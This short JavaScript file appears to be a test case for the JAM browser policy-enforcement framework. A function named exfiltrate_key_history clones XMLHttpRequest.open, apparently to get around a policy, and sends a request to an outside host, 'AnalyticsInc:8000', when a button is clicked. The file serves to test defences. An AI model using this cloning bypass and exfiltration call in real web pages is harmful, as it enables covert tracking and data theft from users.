
JAM.startProfile('load');
function exfiltrate_key_history(){function v0(){function temp(){return JAM.call(that.apply,that,[this,arguments],JAM.policy.p1)}var that=this,key;for(key in this)this.hasOwnProperty(key)&&JAM.set(temp,key,this[key]);return temp}xmlhttp=new XMLHttpRequest;xmlhttp.open.clone=v0;var v3=xmlhttp,v6=xmlhttp.open.clone();v3.opennew=v6;JAM.call(xmlhttp.opennew,xmlhttp,["GET","http://AnalyticsInc:8000/submission.html?test=clone3",!0],JAM.policy.p1);xmlhttp.send(null)}
JAM.set(document.getElementById("test"),"onclick",exfiltrate_key_history)

JAM.stopProfile('load');
